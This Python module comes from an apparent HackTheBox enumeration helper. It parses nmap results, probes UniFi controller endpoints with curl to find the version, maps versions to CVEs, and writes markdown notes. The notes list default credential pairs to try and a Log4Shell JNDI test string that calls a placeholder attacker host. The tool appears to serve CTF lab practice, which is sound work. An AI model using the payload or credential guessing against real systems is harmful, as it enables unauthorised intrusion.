"""
Automatic analysis of enumeration results for cyba-Inspector
"""

import re
from pathlib import Path

class AutoAnalyzer:
    def __init__(self):
        self.services_db = {
            'unifi': {
                'keywords': ['UniFi', 'Ubiquiti', 'UniFi Network'],
                'default_creds': [
                    'ubnt:ubnt',
                    'admin:admin', 
                    'admin:ubnt',
                    'admin:password'
                ],
                'version_endpoints': [
                    '/status',
                    '/api/s/default/stat/sysinfo',
                    '/api/system/info',
                    '/manage/account/login'
                ],
                'version_patterns': [
                    r'"version"\s*:\s*"([^"]+)"',
                    r'UniFi Network (\d+\.\d+\.\d+)',
                    r'\.js\?v=(\d+\.\d+\.\d+)',
                    r'"build"\s*:\s*"([^"]+)"'
                ],
                'cve_by_version': {
                    '6.5.53': ['CVE-2021-44228 (Log4Shell) - RCE via JNDI injection'],
                    '6.4.54': ['CVE-2021-44228', 'CVE-2021-44515 - Auth Bypass'],
                    '5.x': ['CVE-2020-12823 - Command Injection']
                },
                'ports': [8443, 8080, 8843, 8880, 6789],
                'recommendations': [
                    'Check for default credentials',
                    'Test for Log4Shell vulnerability',
                    'Look for exposed backup files',
                    'Check /api/login endpoint'
                ]
            },
            'apache': {
                'keywords': ['Apache', 'httpd'],
                'common_cves': ['CVE-2021-41773', 'CVE-2021-42013'],
                'recommendations': ['Check for .htaccess files', 'Directory traversal']
            },
            'ssh': {
                'keywords': ['OpenSSH', 'SSH'],
                'recommendations': ['Check for weak credentials', 'Look for SSH keys']
            }
        }
    
    def analyze_nmap_results(self, nmap_file):
        """Analyze nmap results and extract key information"""
        findings = {
            'services': [],
            'open_ports': [],
            'os': None,
            'vulnerabilities': [],
            'recommendations': []
        }
        
        try:
            with open(nmap_file, 'r') as f:
                content = f.read()
            
            # Extract open ports and services
            port_pattern = r'(\d+)/tcp\s+open\s+(\S+)\s*(.*?)(?=\n(?:\d+/tcp|\||Service Info|$))'
            for match in re.finditer(port_pattern, content, re.MULTILINE | re.DOTALL):
                port = match.group(1)
                service = match.group(2)
                version_info = match.group(3).strip()
                
                # Clean up version info - take only first line
                version_lines = version_info.split('\n')
                version = version_lines[0].strip() if version_lines else ''
                
                findings['open_ports'].append({
                    'port': port,
                    'service': service,
                    'version': version
                })
                
                # Check for known services
                full_line = f"{service} {version}".lower()
                for service_name, service_info in self.services_db.items():
                    if any(keyword.lower() in full_line for keyword in service_info['keywords']):
                        findings['services'].append({
                            'name': service_name,
                            'details': service_info,
                            'port': port,
                            'version': version
                        })
            
            # Extract OS information
            os_pattern = r'Service Info:.*OS:\s*([^;]+)'
            os_match = re.search(os_pattern, content)
            if os_match:
                findings['os'] = os_match.group(1).strip()
            
            # Check for specific service detections
            if 'UniFi' in content:
                unifi_service = {
                    'name': 'UniFi Network Controller',
                    'details': self.services_db['unifi'],
                    'port': '8443'
                }
                
                # Auto-detect version
                version = self._detect_service_version('unifi', findings['open_ports'])
                if version:
                    unifi_service['version'] = version
                    unifi_service['cves'] = self._get_cves_for_version('unifi', version)
                
                findings['services'].append(unifi_service)
            
            return findings
            
        except Exception as e:
            print(f"Error analyzing nmap results: {e}")
            return findings
    
    def _detect_service_version(self, service_name, open_ports):
        """Auto-detect service version by querying endpoints"""
        import subprocess
        import json
        
        if service_name not in self.services_db:
            return None
        
        service_info = self.services_db[service_name]
        target_ports = []
        
        # Find relevant ports
        for port_info in open_ports:
            if int(port_info['port']) in service_info.get('ports', []):
                target_ports.append(port_info['port'])
        
        if not target_ports:
            return None
        
        # Get target IP from current directory structure
        import os
        target_ip = None
        cwd = os.getcwd()
        
        # Try to find IP from nmap files
        for file in ['nmap_initial.txt', 'nmap_detailed.nmap']:
            if os.path.exists(file):
                with open(file, 'r') as f:
                    content = f.read()
                    ip_match = re.search(r'Nmap scan report for (\d+\.\d+\.\d+\.\d+)', content)
                    if ip_match:
                        target_ip = ip_match.group(1)
                        break
        
        if not target_ip:
            return None
        
        # Try each endpoint to get version
        for endpoint in service_info.get('version_endpoints', []):
            for port in target_ports[:1]:  # Try first relevant port
                url = f"https://{target_ip}:{port}{endpoint}"
                
                try:
                    # Use curl to fetch the endpoint
                    cmd = ['curl', '-k', '-s', '--max-time', '5', url]
                    result = subprocess.run(cmd, capture_output=True, text=True)
                    
                    if result.returncode == 0 and result.stdout:
                        # Try to extract version from response
                        for pattern in service_info.get('version_patterns', []):
                            match = re.search(pattern, result.stdout)
                            if match:
                                version = match.group(1)
                                print(f"[+] Detected {service_name} version: {version}")
                                return version
                
                except Exception:
                    continue
        
        return None
    
    def _get_cves_for_version(self, service_name, version):
        """Get CVEs based on detected version"""
        if service_name not in self.services_db:
            return []
        
        cve_db = self.services_db[service_name].get('cve_by_version', {})
        cves = []
        
        # Check exact version match
        if version in cve_db:
            cves.extend(cve_db[version])
        
        # Check version ranges
        for ver_pattern, ver_cves in cve_db.items():
            if 'x' in ver_pattern:
                # Handle patterns like '5.x'
                major_ver = ver_pattern.split('.')[0]
                if version.startswith(major_ver + '.'):
                    cves.extend(ver_cves)
            elif '<=' in ver_pattern or '>=' in ver_pattern:
                # Handle version comparisons
                # TODO: Implement version comparison logic
                pass
        
        # Check if vulnerable to Log4Shell based on version
        try:
            ver_parts = version.split('.')
            if len(ver_parts) >= 3:
                major, minor, patch = int(ver_parts[0]), int(ver_parts[1]), int(ver_parts[2])
                
                # UniFi versions <= 6.5.53 are vulnerable to Log4Shell
                if (major < 6) or (major == 6 and minor < 5) or (major == 6 and minor == 5 and patch <= 53):
                    if 'CVE-2021-44228' not in str(cves):
                        cves.append('CVE-2021-44228 (Log4Shell) - RCE vulnerability')
        except:
            pass
        
        return list(set(cves))  # Remove duplicates
    
    def generate_documentation_update(self, machine_name, findings):
        """Generate documentation update based on findings"""
        doc_update = {}
        
        # Services section
        services_text = "## Services Found\n\n"
        for port_info in findings['open_ports']:
            services_text += f"- **Port {port_info['port']}**: {port_info['service']}"
            if port_info['version']:
                services_text += f" ({port_info['version']})"
            services_text += "\n"
        
        # Key findings section
        key_findings = "\n## Key Findings\n\n"
        for service in findings['services']:
            key_findings += f"### {service['name']}\n"
            if 'version' in service:
                key_findings += f"Version: {service['version']}\n\n"
            
            if 'default_creds' in service['details']:
                key_findings += "**Default Credentials to test:**\n"
                for cred in service['details']['default_creds']:
                    key_findings += f"- `{cred}`\n"
                key_findings += "\n"
            
            # Show detected CVEs if version was found
            if 'cves' in service and service['cves']:
                key_findings += f"**⚠️ CVEs for version {service.get('version', 'unknown')}:**\n"
                for cve in service['cves']:
                    key_findings += f"- **{cve}**\n"
                key_findings += "\n"
            elif 'common_cves' in service['details']:
                key_findings += "**Known CVEs (version not detected):**\n"
                for cve in service['details']['common_cves']:
                    key_findings += f"- {cve}\n"
                key_findings += "\n"
            
            if 'recommendations' in service['details']:
                key_findings += "**Recommendations:**\n"
                for rec in service['details']['recommendations']:
                    key_findings += f"- {rec}\n"
                key_findings += "\n"
        
        # Initial access hints
        initial_access = "\n## Initial Access Vectors\n\n"
        if any('unifi' in s['name'].lower() for s in findings['services']):
            initial_access += "### UniFi Network Controller\n"
            initial_access += "1. Try default credentials at `https://[IP]:8443/manage/account/login`\n"
            initial_access += "2. Test for Log4Shell: `${jndi:ldap://[YOUR_IP]/test}`\n"
            initial_access += "3. Check for exposed backup files\n\n"
        
        doc_update['services'] = services_text
        doc_update['findings'] = key_findings
        doc_update['initial_access'] = initial_access
        
        return doc_update
    
    def update_machine_documentation(self, machine_path, findings):
        """Update the machine's markdown documentation"""
        machine_name = Path(machine_path).name
        doc_file = Path(machine_path).parent.parent / "htb-docs" / "starting-point" / f"{machine_name.lower()}.md"
        
        if not doc_file.exists():
            print(f"Documentation file not found: {doc_file}")
            return
        
        try:
            # Read existing content
            with open(doc_file, 'r') as f:
                content = f.read()
            
            # Generate updates
            updates = self.generate_documentation_update(machine_name, findings)
            
            # Update services section
            if "## Services Found" in content:
                # Replace existing services section
                start = content.find("## Services Found")
                end = content.find("##", start + 1)
                if end == -1:
                    end = len(content)
                
                content = content[:start] + updates['services'] + "\n" + content[end:]
            
            # Add key findings if not present
            if "## Key Findings" not in content:
                # Insert after services
                services_end = content.find("## Enumeration Results")
                if services_end > 0:
                    content = content[:services_end] + updates['findings'] + "\n" + content[services_end:]
            
            # Write updated content
            with open(doc_file, 'w') as f:
                f.write(content)
            
            print(f"[+] Documentation updated for {machine_name}")
            
        except Exception as e:
            print(f"Error updating documentation: {e}")

# Auto-run when report is generated
def auto_analyze_and_update(session_data, output_dir):
    """Called automatically after enumeration completes"""
    analyzer = AutoAnalyzer()
    
    # Find nmap detailed results
    nmap_detailed = Path(output_dir) / "nmap_detailed.nmap"
    if nmap_detailed.exists():
        findings = analyzer.analyze_nmap_results(nmap_detailed)
        
        # Update documentation
        analyzer.update_machine_documentation(output_dir, findings)
        
        return findings
    
    return None